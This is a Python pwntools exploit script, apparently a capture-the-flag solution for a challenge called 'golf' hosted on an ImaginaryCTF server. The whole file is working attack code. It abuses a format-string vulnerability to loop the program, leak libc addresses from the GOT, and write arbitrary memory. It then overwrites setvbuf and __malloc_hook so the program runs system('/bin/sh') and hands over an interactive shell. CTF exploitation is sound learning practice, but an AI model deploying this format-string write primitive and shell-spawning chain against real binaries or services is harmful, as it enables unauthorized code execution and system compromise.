from pwn import *

context.binary = elf = ELF("./golf")
libc = ELF("./libc.so.6")
#conn = elf.process()
conn = remote("golf.chal.imaginaryctf.org", 1337)
#context.log_level = 'debug'
#gdb.attach(conn)

# get infinite format strings
payload = b"%*8$c%9$ln".ljust(16, b'\0')
payload += p64(elf.sym.main)
payload += p64(elf.got.exit)
conn.sendline(payload)
conn.recvuntil(b"\x03")

payload = b"%8$s".ljust(16, b'\0')
payload += p64(elf.got.fgets)
conn.sendline(payload)
libc.address = u64(conn.recv(6) + b'\0\0') - libc.sym.fgets
info("libc @ " + hex(libc.address))

# arb write, for addresses
def write(what, where):
  payload = (b"%9$hn" if what>>0==0 else b"%*8$c%9$hn").ljust(16, b'\0')
  payload += p64((what)%(2**16))
  payload += p64(where)
  conn.sendline(payload)
  payload = (b"%9$hn" if what>>16==0 else b"%*8$c%9$hn").ljust(16, b'\0')
  payload += p64(((what)>>16)%(2**16))
  payload += p64(where+2)
  conn.sendline(payload)
  payload = (b"%9$hn" if what>>32==0 else b"%*8$c%9$hn").ljust(16, b'\0')
  payload += p64(((what)>>32)%(2**16))
  payload += p64(where+4)
  conn.sendline(payload)
  payload = (b"%9$hn" if what>>48==0 else b"%*8$c%9$hn").ljust(16, b'\0')
  payload += p64(((what)>>48)%(2**16))
  payload += p64(where+6)
  conn.sendline(payload)

# one gadgets didnt work for me :(
write(next(libc.search(b"/bin/sh\0")), elf.sym.stderr) # in the constructor, setvbuf is called on this
write(libc.sym.system, elf.got.setvbuf) # make setvbuf system
write(elf.sym._, libc.sym.__malloc_hook) # call the constructor that does setvbuf
conn.sendline(b"%100000c") # trigger it

conn.sendline(b"echo sus")
conn.recvuntil(b"sus")

conn.interactive()
